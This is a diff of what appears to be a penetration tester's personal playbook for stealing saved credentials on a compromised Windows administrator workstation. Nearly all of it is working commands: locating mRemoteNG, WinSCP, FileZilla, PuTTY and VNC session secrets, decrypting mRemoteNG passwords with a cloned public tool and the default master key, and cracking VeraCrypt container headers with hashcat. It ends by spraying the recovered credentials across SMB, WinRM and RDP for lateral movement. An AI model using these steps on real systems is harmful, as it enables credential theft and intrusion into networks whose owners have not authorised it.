@@ -1,33 +1,37 @@
-# Remote Manager Looting
+# Windows privesc: remote manager credentials
 
 ## Before I start
-- [ ] Foothold on an admin's workstation or jumpbox — the prize is their saved sessions: :Pb windows-creds
+- [ ] A shell on an administrator's workstation or a jump host: their saved sessions are the prize, and :Pb windows-creds covers the rest
 
 ## mRemoteNG
 dir /s /b C:\Users\*\confCons.xml
-python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -f confCons.xml
-- [ ] Default master password mR3m covers most installs; garbage output = custom password → mremoteng2john + targeted crack
-- [ ] Also check Documents/Desktop/file shares — admins export confCons backups
+On Kali, mRemoteNG-Decrypt, from https://github.com/haseebT/mRemoteNG-Decrypt, with THE-PASSWORD-VALUE a Password="..." value from confCons.xml:
+git clone https://github.com/haseebT/mRemoteNG-Decrypt
+python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s 'THE-PASSWORD-VALUE'
+- [ ] The default master password, mR3m, covers most installs; an error means a custom one, given with -p once I know it
+- [ ] Documents, the Desktop and file shares as well: administrators export confCons backups
 
-## WinSCP / FileZilla / PuTTY
+## WinSCP, FileZilla and PuTTY
 reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
 type %APPDATA%\FileZilla\recentservers.xml
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
-- [ ] WinSCP passwords: reversible cipher → winscp_decrypt PoC
-- [ ] FileZilla: base64 (or plaintext) — decode and done
-- [ ] PuTTY stores no passwords but leaks every host+username = spray list: :Pb spraying
+- [ ] WinSCP passwords use a reversible cipher, which any public WinSCP password decoder reads
+- [ ] FileZilla's are base64, or plain text
+- [ ] PuTTY stores no passwords, but every host and username it knows is a list to spray: :Pb spraying
 
 ## VNC
 reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
 reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password
-- [ ] Fixed DES key — any vnc-decrypt PoC opens it; password usually shared across the fleet
+- [ ] Encrypted with a fixed DES key that every VNC password decoder knows; the password is often the same on every host
 
-## VeraCrypt / TrueCrypt
+## VeraCrypt and TrueCrypt containers
 Get-ChildItem -Path C:\ -Recurse -Include *.hc,*.tc -ErrorAction SilentlyContinue
-dd if=container.hc of=vc.hash bs=512 count=1
-hashcat -m 13721 vc.hash targeted.txt
-- [ ] Slowest modes in hashcat — tiny targeted list or skip
+On Kali, with the container sent back into loot/ as <File>, and THE-WORDLIST a short list of my own:
+dd if=<File> of=vc.hash bs=512 count=1
+hashcat -m 13721 vc.hash THE-WORDLIST
+- [ ] 13721 is VeraCrypt with SHA-512 and a single cipher; other hashes and cascades have modes of their own, listed by hashcat --help
+- [ ] Among hashcat's slowest modes: a very short list, or not at all: :Pb wordlists
 
 ## Next
-- [ ] Every recovered cred → SMB/WinRM/RDP sweep across the subnet: :Pb lateral-movement
-- [ ] Root creds for infra boxes → :Pb linux-creds on those hosts
+- [ ] Every credential recovered, tried on SMB, WinRM and RDP across the network: :Pb lateral-movement
+- [ ] Root credentials for other hosts: :Pb linux-creds once on them
